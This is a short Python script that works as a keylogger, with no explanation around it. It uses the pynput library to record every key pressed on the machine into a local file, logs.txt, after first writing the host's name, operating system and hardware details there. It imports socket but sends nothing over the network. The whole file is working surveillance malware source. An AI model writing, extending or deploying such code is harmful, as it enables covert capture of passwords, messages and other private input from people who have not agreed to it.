from pynput import keyboard 
import os
import socket

def get_host_info():
    host_info = os.uname()
    with open('logs.txt', 'a') as logs:
        logs.write(f"Host: {host_info.nodename}\n")
        logs.write(f"System: {host_info.sysname}\n")
        logs.write(f"Release: {host_info.release}\n")
        logs.write(f"Version: {host_info.version}\n")
        logs.write(f"Machine: {host_info.machine}\n")
        logs.write("\n")

def keylog(key):
    print(str(key))
    with open('logs.txt', 'a') as logs:
        try:
            if key == keyboard.Key.enter:
                logs.write("\n")
            elif key == keyboard.Key.space:
                logs.write(" ")
            else:
                logs.write(key.char)
        except:
            print("skipi abdsami3")
            pass

            
if __name__ == "__main__":
    get_host_info()
    listener = keyboard.Listener(on_press=keylog)
    listener.start()
    listener.join()
    input()

    
    
    



    
    
    
    
    


